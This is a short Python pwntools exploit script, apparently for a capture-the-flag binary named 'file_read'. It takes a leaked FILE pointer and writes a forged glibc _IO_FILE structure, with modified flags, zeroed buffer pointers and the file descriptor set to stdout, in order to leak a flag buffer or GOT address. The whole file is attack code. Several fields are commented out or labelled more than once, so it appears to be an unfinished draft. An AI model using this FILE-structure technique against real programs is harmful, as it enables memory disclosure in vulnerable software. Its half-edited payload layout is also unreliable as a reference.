from pwn import *
p = process("./file_read")
elf = ELF('file_read')
addr_flag = elf.symbols['flag_buf']
addr_flag = elf.got['printf']
print p.recvuntil("PTR: ")
fp = int(p.recvuntil("\n").strip("\n"),16)
print hex(fp)
print p.sendlineafter("Addr: ", str(fp))
payload = p64(0xfbad2484 | 0x1000)
payload += p64(0) # _IO_read_ptr
#payload += p64(addr_flag) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_read_base
#payload += p64(addr_flag) # _IO_write_base 
#payload += p64(addr_flag + 0x100) # _IO_write_ptr 
payload += p64(0) # _IO_write_end 
payload += p64(0) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) 
payload += p64(1) # stdout
raw_input('debug: ' + str(p.pid))
print p.sendlineafter("Value: ", str(payload))
p.interactive()
